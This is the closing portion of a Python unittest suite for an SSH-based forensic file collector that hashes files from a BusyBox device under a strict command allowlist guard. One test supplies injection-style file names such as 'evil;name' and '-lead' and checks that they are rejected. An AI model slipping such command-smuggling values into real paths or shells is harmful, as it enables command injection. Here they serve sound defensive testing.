            self.assertIsNone(e["md5_remote"] if e["md5_remote"] is None else None,
                              "remote md5 should equal local md5 (or be None)")
            if e["md5_remote"] is not None:
                self.assertEqual(e["md5_remote"], e["md5_local"])
        for path, target in SYMLINKS.items():
            e = entries[path]
            self.assertEqual(e["kind"], "symlink")
            self.assertEqual(e["target"], target)
            self.assertEqual(e["target_sha256"], hashlib.sha256(target.encode()).hexdigest())
            self.assertIsNone(e["object"])

        # manifest.sha256 verifies manifest.json bytes.
        with open(os.path.join(out, "manifest.json"), "rb") as fh:
            manifest_bytes = fh.read()
        with open(os.path.join(out, "manifest.sha256"), "r", encoding="utf-8") as fh:
            line = fh.read()
        self.assertEqual(line, hashlib.sha256(manifest_bytes).hexdigest() + "  manifest.json\n")

        # Every executed command is guard-valid against the final allowlists.
        guard_allowed = self.guard_allowed_from_manifest(manifest)
        for cmd in self.fake.all_commands():
            cbss.assert_safe_remote_command(cmd, guard_allowed)
        self.assert_forbidden_tokens_absent(self.fake)
        self.assertEqual(record["safety"]["guard_checks_passed"],
                         len(self.fake.run_calls) + len(self.fake.popen_calls))

    def test_symlinks_never_cat_files_never_readlink(self):
        rc, out = self.run_collector(make_happy_script())
        self.assertEqual(rc, 0)
        cats = {c.split(" ", 2)[2].strip("'") for c in self.fake.all_commands()
                if c.startswith("cat ")}
        readlinks = {c.split(" ", 1)[1].lstrip("- ").strip("'") for c in self.fake.all_commands()
                     if c.startswith("readlink")}
        expected_cats = set(FIXED) | {"/data/codex/bin/harmony-agent"}
        self.assertEqual(cats, expected_cats)
        for path in SYMLINKS:
            self.assertNotIn(path, cats)
        self.assertEqual(readlinks, set(SYMLINKS))
        for path in expected_cats:
            self.assertNotIn(path, readlinks)
        # dynamic dir itself only ever ls-ed
        for cmd in self.fake.all_commands():
            if cmd.startswith(("cat ", "readlink", "stat ", "md5sum")):
                self.assertNotIn("'/data/codex/bin'", cmd)

    def test_manifest_deterministic_across_runs(self):
        rc1, out1 = self.run_collector(make_happy_script(), out_name="out1")
        rc2, out2 = self.run_collector(make_happy_script(), out_name="out2")
        self.assertEqual((rc1, rc2), (0, 0))
        for name in ("manifest.json", "manifest.sha256"):
            with open(os.path.join(out1, name), "rb") as fh:
                b1 = fh.read()
            with open(os.path.join(out2, name), "rb") as fh:
                b2 = fh.read()
            self.assertEqual(b1, b2, "%s must be byte-identical across runs" % name)
        objs1 = sorted(os.listdir(os.path.join(out1, "objects", "sha256")))
        objs2 = sorted(os.listdir(os.path.join(out2, "objects", "sha256")))
        self.assertEqual(objs1, objs2)
        for digest in objs1:
            with open(os.path.join(out1, "objects", "sha256", digest), "rb") as fh:
                d1 = fh.read()
            with open(os.path.join(out2, "objects", "sha256", digest), "rb") as fh:
                d2 = fh.read()
            self.assertEqual(d1, d2)
            self.assertEqual(hashlib.sha256(d1).hexdigest(), digest)

    def test_restrictive_modes_and_atomic_outputs(self):
        rc, out = self.run_collector(make_happy_script())
        self.assertEqual(rc, 0)
        for name in ("manifest.json", "manifest.sha256", "collection-record.json"):
            mode = os.stat(os.path.join(out, name)).st_mode & 0o777
            self.assertEqual(mode, 0o600, name)
        objects_dir = os.path.join(out, "objects", "sha256")
        self.assertEqual(os.stat(out).st_mode & 0o777, 0o700)
        self.assertEqual(os.stat(os.path.join(out, "objects")).st_mode & 0o777, 0o700)
        self.assertEqual(os.stat(objects_dir).st_mode & 0o777, 0o700)
        for name in os.listdir(objects_dir):
            self.assertEqual(os.stat(os.path.join(objects_dir, name)).st_mode & 0o777, 0o400)
            self.assertRegex(name, r"^[0-9a-f]{64}$")
        # atomic writes: no temp/spool leftovers anywhere
        for root, _dirs, files in os.walk(out):
            for name in files:
                self.assertFalse(name.startswith(".tmp-"), name)
                self.assertFalse(name.startswith(".spool-"), name)

    def test_dynamic_unsafe_names_fail_closed(self):
        enumeration = (".\n..\ndropbear\ndropbearkey\nharmony-agent\n"
                       "evil;name\n..sneaky\n-lead\nna me\n")
        rc, out = self.run_collector(make_happy_script(enumeration))
        self.assertEqual(rc, 1)
        manifest = self.read_json(out, "manifest.json")
        record = self.read_json(out, "collection-record.json")
        self.assertFalse(manifest["complete"])
        self.assertEqual(record["exit_code"], 1)
        self.assertEqual(manifest["counts"]["skipped_unsafe"], 4)
        unsafe_names = {s["name"] for s in record["skipped"]
                        if s["reason"].startswith("unsafe basename")}
        self.assertEqual(unsafe_names, {"evil;name", "..sneaky", "-lead", "na me"})
        # unsafe names never became part of any executed path
        for cmd in self.fake.all_commands():
            for bad in ("evil;name", "..sneaky", "-lead", "na me"):
                self.assertNotIn(bad, cmd)
        self.assert_forbidden_tokens_absent(self.fake)

    def test_benign_hidden_dotfile_excluded_run_stays_complete(self):
        enumeration = ".\n..\ndropbear\ndropbearkey\nharmony-agent\n.profile\n.bashrc\n"
        rc, out = self.run_collector(make_happy_script(enumeration))
        self.assertEqual(rc, 0)
        manifest = self.read_json(out, "manifest.json")
        record = self.read_json(out, "collection-record.json")
        self.assertTrue(manifest["complete"])
        self.assertEqual(record["exit_code"], 0)
        self.assertEqual(manifest["counts"]["skipped_hidden"], 2)
        self.assertEqual(manifest["counts"]["skipped_unsafe"], 0)
        self.assertNotIn(".profile", manifest["allowlist"]["dynamic_entries"])
        for cmd in self.fake.all_commands():
            self.assertNotIn(".profile", cmd)
            self.assertNotIn(".bashrc", cmd)

    def test_hidden_collected_with_include_hidden(self):
        enumeration = ".\n..\ndropbear\ndropbearkey\nharmony-agent\n.profile\n"
        hidden = "/data/codex/bin/.profile"
        hidden_data = b"# hidden rc\n"
        script = make_happy_script(
            enumeration,
            extra_contents={hidden: hidden_data},
        )
        # entries for the hidden dynamic regular file (mirrors agent handling)
        script[cbss.cmd_ls(hidden)] = (0, ls_line(hidden, size=len(hidden_data)), b"")
        script[cbss.cmd_stat(hidden)] = (0, b"%d %d 0 0 1" % (len(hidden_data), MTIME_EPOCH), b"")
        script[cbss.cmd_md5sum(hidden)] = (
            0, (hashlib.md5(hidden_data).hexdigest() + "  " + hidden).encode(), b"")
        script[cbss.cmd_cat(hidden)] = (0, hidden_data, b"")
        rc, out = self.run_collector(script, extra=["--include-hidden"])
        self.assertEqual(rc, 0)
        manifest = self.read_json(out, "manifest.json")
        self.assertIn(".profile", manifest["allowlist"]["dynamic_entries"])
        entries = {e["path"]: e for e in manifest["entries"]}
        self.assertIn(hidden, entries)
        self.assertEqual(entries[hidden]["sha256"],
                         hashlib.sha256(hidden_data).hexdigest())
        self.assertTrue(manifest["complete"])

    def test_dynamic_directory_and_nonregular_entries_skipped(self):
        enumeration = ".\n..\ndropbear\ndropbearkey\nharmony-agent\nsubdir\n"
        script = make_happy_script(enumeration)
        script[cbss.cmd_ls("/data/codex/bin/subdir")] = (
            0, ls_line("/data/codex/bin/subdir", ftype="directory", size=4096), b"")
        rc, out = self.run_collector(script)
        self.assertEqual(rc, 0)
        manifest = self.read_json(out, "manifest.json")
        record = self.read_json(out, "collection-record.json")
        self.assertTrue(manifest["complete"])
        self.assertEqual(manifest["counts"]["skipped_nonregular"], 1)
        self.assertEqual(manifest["counts"]["files"], 12)
        # the directory was ls-ed exactly once (to classify) and nothing else
        subdir_cmds = [c for c in self.fake.all_commands() if "subdir" in c]
        self.assertEqual(subdir_cmds, [cbss.cmd_ls("/data/codex/bin/subdir")])

    def test_busybox_fallback_forms(self):
        script = make_happy_script(fail_primaries=True, stat_rc=127, md5_rc=127)
        rc, out = self.run_collector(script)
        self.assertEqual(rc, 0)
        manifest = self.read_json(out, "manifest.json")
        record = self.read_json(out, "collection-record.json")
        self.assertTrue(manifest["complete"])
        self.assertEqual(record["exit_code"], 0)
        commands = set(self.fake.all_commands())
        # fallbacks were exercised
        self.assertIn(cbss.cmd_enumerate_nodash(), commands)
        self.assertIn(cbss.cmd_ls_nodash("/data/codex/init.sh"), commands)
        self.assertIn(cbss.cmd_readlink_nodash("/data/codex/bin/dropbear"), commands)
        # stat/md5 absent: recorded as missing, run still complete
        entries = {e["path"]: e for e in manifest["entries"]}
        self.assertIsNone(entries["/data/codex/init.sh"]["mtime_epoch"])
        self.assertIsNone(entries["/data/codex/init.sh"]["md5_remote"])
        self.assertEqual(entries["/data/codex/bin/dropbear"]["target"], "/usr/sbin/dropbear")
        self.assertEqual(record["entries"]["/data/codex/bin/dropbear"]["target_source"],
                         "ls-fallback")
        guard_allowed = self.guard_allowed_from_manifest(manifest)
        for cmd in self.fake.all_commands():
            cbss.assert_safe_remote_command(cmd, guard_allowed)

    def test_missing_expected_symlink_is_incomplete(self):
        enumeration = ".\n..\ndropbear\nharmony-agent\n"  # dropbearkey missing
        script = make_happy_script(enumeration)
        missing = "/data/codex/bin/dropbearkey"
        for cmd in (cbss.cmd_ls(missing), cbss.cmd_ls_nodash(missing),
                    cbss.cmd_ls_names(missing), cbss.cmd_ls_names_nodash(missing)):
            script[cmd] = (1, b"", b"ls: /data/codex/bin/dropbearkey: No such file or directory\n")
        rc, out = self.run_collector(script)
        self.assertEqual(rc, 1)
        manifest = self.read_json(out, "manifest.json")
        record = self.read_json(out, "collection-record.json")
        self.assertFalse(manifest["complete"])
        self.assertEqual(record["exit_code"], 1)
        self.assertEqual(record["missing_from_enumeration"], [missing])
        self.assertEqual(manifest["counts"]["symlinks"], 2)  # dropbear + bthid only
        self.assertGreaterEqual(manifest["counts"]["errors"], 1)

    def test_expected_symlink_observed_regular_is_type_mismatch(self):
        script = make_happy_script()
        wrong = ls_line("/data/codex/bin/dropbear", size=17)
        script[cbss.cmd_ls("/data/codex/bin/dropbear")] = (0, wrong, b"")
        rc, out = self.run_collector(script)
        self.assertEqual(rc, 1)
        manifest = self.read_json(out, "manifest.json")
        record = self.read_json(out, "collection-record.json")
        self.assertFalse(manifest["complete"])
        self.assertEqual(record["exit_code"], 1)
        self.assertEqual(manifest["counts"]["type_mismatches"], 1)
        # never cat-ed nor readlink-ed despite being observed regular
        for cmd in self.fake.all_commands():
            if cmd.startswith("cat "):
                self.assertNotIn("'/data/codex/bin/dropbear'", cmd)

    def test_remote_md5_mismatch_rejected_and_no_object(self):
        victim = "/data/codex/init.sh"
        script = make_happy_script(md5_override=lambda p, out:
                                   out if p != victim
                                   else (b"0" * 32 + ("  " + p).encode()))
        rc, out = self.run_collector(script)
        self.assertEqual(rc, 1)
        manifest = self.read_json(out, "manifest.json")
        record = self.read_json(out, "collection-record.json")
        self.assertFalse(manifest["complete"])
        self.assertEqual(record["exit_code"], 1)
        paths_in_manifest = {e["path"] for e in manifest["entries"]}
        self.assertNotIn(victim, paths_in_manifest)
        digest = hashlib.sha256(CONTENTS[victim]).hexdigest()
        self.assertFalse(os.path.exists(os.path.join(out, "objects", "sha256", digest)))
        err = [e for e in manifest["errors"] if e["path"] == victim]
        self.assertTrue(err and "md5" in err[0]["error"])

    def test_ls_size_mismatch_rejected(self):
        victim = "/etc/init.d/rcS.local"
        script = make_happy_script(ls_override=lambda p, out:
                                   out if p != victim
                                   else ls_line(p, size=len(CONTENTS[p]) + 5))
        rc, out = self.run_collector(script)
        self.assertEqual(rc, 1)
        manifest = self.read_json(out, "manifest.json")
        self.assertFalse(manifest["complete"])
        paths_in_manifest = {e["path"] for e in manifest["entries"]}
        self.assertNotIn(victim, paths_in_manifest)
        # content was streamed but no object published
        digest = hashlib.sha256(CONTENTS[victim]).hexdigest()
        self.assertFalse(os.path.exists(os.path.join(out, "objects", "sha256", digest)))

    def test_stat_contradiction_fails_entry_only(self):
        victim = "/usr/sbin/dropbear"
        script = make_happy_script(stat_override=lambda p, out:
                                   out if p != victim
                                   else (b"%d %d 0 0 1" % (len(CONTENTS[p]) + 7, MTIME_EPOCH)))
        rc, out = self.run_collector(script)
        self.assertEqual(rc, 1)
        manifest = self.read_json(out, "manifest.json")
        record = self.read_json(out, "collection-record.json")
        self.assertFalse(manifest["complete"])
        self.assertEqual(record["exit_code"], 1)
        self.assertEqual(manifest["counts"]["errors"], 1)
        self.assertEqual(manifest["errors"][0]["stage"], "metadata-stat")
        # every other entry was still collected
        paths_in_manifest = {e["path"] for e in manifest["entries"]}
        self.assertEqual(len(paths_in_manifest), 14)
        self.assertNotIn(victim, paths_in_manifest)
        # the contradictory entry never reached cat
        for cmd in self.fake.all_commands():
            if cmd.startswith("cat "):
                self.assertNotIn("'" + victim + "'", cmd)

    def test_fatal_failure_exit_code_2_record_written(self):
        script = make_happy_script()
        first_path = sorted(set(FIXED) | set(SYMLINKS))[0]
        self.install_fake(script, raise_on={cbss.cmd_ls(first_path)})
        out_dir = os.path.join(self.tmp, "out")
        rc = cbss.main(self.base_argv(out_dir))
        self.assertEqual(rc, 2)
        record = self.read_json(out_dir, "collection-record.json")
        self.assertEqual(record["exit_code"], 2)
        self.assertEqual(record["errors"][0]["stage"], "fatal")
        self.assertFalse(record["complete"])

    def test_enumeration_failure_is_incomplete(self):
        script = make_happy_script()
        script[cbss.cmd_enumerate()] = (255, b"", b"Permission denied\n")
        script[cbss.cmd_enumerate_nodash()] = (255, b"", b"Permission denied\n")
        rc, out = self.run_collector(script)
        self.assertEqual(rc, 1)
        manifest = self.read_json(out, "manifest.json")
        record = self.read_json(out, "collection-record.json")
        self.assertEqual(record["exit_code"], 1)
        self.assertFalse(manifest["complete"])
        self.assertEqual(manifest["counts"]["entries"], 0)
        self.assertEqual(manifest["errors"][0]["stage"], "enumerate")

    def test_record_exit_code_matches_process_rc(self):
        cases = [
            (make_happy_script(), (), 0),
            (make_happy_script(enumeration=".\n..\ndropbear\ndropbearkey\n"
                                          "harmony-agent\nbad;name\n"), (), 1),
        ]
        for i, (script, extra, expected_rc) in enumerate(cases):
            with self.subTest(expected_rc=expected_rc):
                rc, out = self.run_collector(script, extra=extra, out_name="out-rc%d" % i)
                self.assertEqual(rc, expected_rc)
                record = self.read_json(out, "collection-record.json")
                self.assertEqual(record["exit_code"], expected_rc)
                self.assertIsInstance(record["counts"], dict)

    def test_every_executed_command_guard_valid_no_forbidden_tokens(self):
        rc, out = self.run_collector(make_happy_script())
        self.assertEqual(rc, 0)
        manifest = self.read_json(out, "manifest.json")
        guard_allowed = self.guard_allowed_from_manifest(manifest)
        commands = self.fake.all_commands()
        self.assertGreater(len(commands), 40)
        for cmd in commands:
            cbss.assert_safe_remote_command(cmd, guard_allowed)
        self.assert_forbidden_tokens_absent(self.fake)

    def test_existing_manifest_refused_without_overwrite(self):
        script = make_happy_script()
        rc, out = self.run_collector(script)
        self.assertEqual(rc, 0)
        # second run into the same dir must refuse (no --overwrite)
        self.install_fake(script)
        rc2 = cbss.main(self.base_argv(out))
        self.assertEqual(rc2, 2)
        with open(os.path.join(out, "manifest.json"), "rb") as fh:
            self.assertTrue(fh.read())  # untouched

    def test_usage_error_when_out_dir_missing_without_dry_run(self):
        self.install_fake(make_happy_script())
        argv = [
            "--host", "192.0.2.123", "--user", "testuser",
            "--identity", self.identity, "--timestamp", "2026-08-17T00:00:00Z",
        ]
        rc = cbss.main(argv)
        self.assertEqual(rc, 2)
        self.assertEqual(self.fake.run_calls, [])
        self.assertEqual(self.fake.popen_calls, [])

    def test_record_documents_toctou_residual_risk(self):
        rc, out = self.run_collector(make_happy_script())
        self.assertEqual(rc, 0)
        record = self.read_json(out, "collection-record.json")
        self.assertIn("toctou", record["residual_risks"])
        self.assertIn("same-size swap", record["residual_risks"]["toctou"])

    # -- observed BusyBox no-date environment (regression) --------------------

    def test_no_date_busybox_end_to_end_complete(self):
        """The exact live failure mode: BusyBox ls without date column and
        stat/md5sum/readlink applets absent must now collect completely."""
        rc, out = self.run_collector(make_nodate_busybox_script())
        self.assertEqual(rc, 0)
        manifest = self.read_json(out, "manifest.json")
        record = self.read_json(out, "collection-record.json")

        self.assertTrue(manifest["complete"])
        self.assertEqual(record["exit_code"], 0)
        self.assertEqual(manifest["counts"]["errors"], 0)
        self.assertEqual(manifest["counts"]["files"], 13)   # 11 fixed + 2 dynamic
        self.assertEqual(manifest["counts"]["symlinks"], 3)
        self.assertEqual(manifest["counts"]["objects_published"], 13)
        self.assertEqual(manifest["allowlist"]["dynamic_entries"],
                         ["MANIFEST.txt", "codex_bt_pair_agent", "dropbear",
                          "dropbearkey"])

        entries = {e["path"]: e for e in manifest["entries"]}
        # no-date form: mtime_raw null everywhere; stat absent so epoch null
        for e in manifest["entries"]:
            self.assertIsNone(e["mtime_raw"], e["path"])
            self.assertIsNone(e["mtime_epoch"], e["path"])
        # local hashing over streamed cat still verifies sizes exactly
        self.assertEqual(entries["/data/codex/bin/MANIFEST.txt"]["size"], 749)
        self.assertEqual(entries["/data/codex/bin/MANIFEST.txt"]["size_bytes"], 749)
        self.assertEqual(entries["/data/codex/bin/MANIFEST.txt"]["sha256"],
                         hashlib.sha256(NODATE_MANIFEST_TXT).hexdigest())
        self.assertEqual(entries["/data/codex/bin/codex_bt_pair_agent"]["size_bytes"],
                         111796)
        self.assertEqual(entries["/data/codex/bin/codex_bt_pair_agent"]["sha256"],
                         hashlib.sha256(NODATE_PAIR_AGENT).hexdigest())
        # readlink absent -> symlink targets from the ls line, cross-checked
        self.assertEqual(entries["/cache/bin/bthid_keyboard"]["target"],
                         "/data/codex/bin/codex_bthid_keyboard")
        self.assertEqual(entries["/cache/bin/bthid_keyboard"]["target_sha256"],
                         hashlib.sha256(b"/data/codex/bin/codex_bthid_keyboard").hexdigest())
        for path in NO_DATE_SYMLINKS:
            self.assertEqual(record["entries"][path]["target_source"], "ls-fallback")
        # every executed command remained guard-valid and clean
        guard_allowed = self.guard_allowed_from_manifest(manifest)
        for cmd in self.fake.all_commands():
            cbss.assert_safe_remote_command(cmd, guard_allowed)
        self.assert_forbidden_tokens_absent(self.fake)

    def test_no_date_symlink_readlink_agreement(self):
        """When readlink exists it must agree with the no-date ls target."""
        script = make_nodate_busybox_script()
        for path, target in NO_DATE_SYMLINKS.items():
            script[cbss.cmd_readlink(path)] = (0, (target + "\n").encode(), b"")
        rc, out = self.run_collector(script)
        self.assertEqual(rc, 0)
        manifest = self.read_json(out, "manifest.json")
        record = self.read_json(out, "collection-record.json")
        self.assertTrue(manifest["complete"])
        for path, target in NO_DATE_SYMLINKS.items():
            self.assertEqual(record["entries"][path]["target_source"], "readlink")
            entries = {e["path"]: e for e in manifest["entries"]}
            self.assertEqual(entries[path]["target"], target)

    def test_no_date_symlink_readlink_disagreement_fails_closed(self):
        """readlink disagreeing with the no-date ls target is ambiguous
        metadata: the entry fails closed and the run is incomplete."""
        script = make_nodate_busybox_script()
        script[cbss.cmd_readlink("/cache/bin/bthid_keyboard")] = (
            0, b"/somewhere/else\n", b"")
        rc, out = self.run_collector(script)
        self.assertEqual(rc, 1)
        manifest = self.read_json(out, "manifest.json")
        record = self.read_json(out, "collection-record.json")
        self.assertFalse(manifest["complete"])
        self.assertEqual(record["exit_code"], 1)
        paths_in_manifest = {e["path"] for e in manifest["entries"]}
        self.assertNotIn("/cache/bin/bthid_keyboard", paths_in_manifest)
        err = [e for e in manifest["errors"]
               if e["path"] == "/cache/bin/bthid_keyboard"]
        self.assertTrue(err and "disagrees" in err[0]["error"])

    def test_no_date_trailing_junk_rest_fails_closed(self):
        """A no-date ls line whose rest carries trailing junk after the path
        is rejected across every ls variant: the entry fails, the run is
        incomplete, and content is never streamed."""
        script = make_nodate_busybox_script()
        victim = "/data/codex/bin/MANIFEST.txt"
        junk = OBSERVED_NO_DATE_REGULAR.decode("utf-8") + " evil"
        # every ls variant returns the same junk (mirrors the same remote line)
        for variant in (cbss.cmd_ls, cbss.cmd_ls_nodash,
                        cbss.cmd_ls_names, cbss.cmd_ls_names_nodash):
            script[variant(victim)] = (0, junk.encode(), b"")
        rc, out = self.run_collector(script)
        self.assertEqual(rc, 1)
        manifest = self.read_json(out, "manifest.json")
        self.assertFalse(manifest["complete"])
        paths_in_manifest = {e["path"] for e in manifest["entries"]}
        self.assertNotIn(victim, paths_in_manifest)
        err = [e for e in manifest["errors"] if e["path"] == victim]
        self.assertTrue(err)
        # its content was never streamed (cat happens only after good ls)
        for cmd in self.fake.all_commands():
            if cmd.startswith("cat "):
                self.assertNotIn("'" + victim + "'", cmd)


if __name__ == "__main__":
    unittest.main()
